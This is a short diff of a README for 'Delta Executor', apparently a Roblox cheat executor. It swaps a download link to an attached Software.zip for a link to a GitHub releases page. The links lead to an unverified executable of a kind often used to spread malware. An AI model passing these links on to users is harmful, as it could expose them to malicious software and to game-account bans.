@@ -22,7 +22,7 @@ In this repository, you can explore the inner workings of Delta Executor and gai
 
 Ready to experience the power of Delta Executor for yourself? Simply click the button below to download the software and launch your journey into the world of advanced Roblox scripting.
 
-[![Download Delta Executor](https://img.shields.io/badge/Download-Delta%20Executor-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Delta Executor](https://github.com/Communismbelike/Delta-Executor/releases/tag/v2.0%20Executor-blue)](https://github.com/Communismbelike/Delta-Executor/releases/tag/v2.0)
 
 ## Not Working?
 
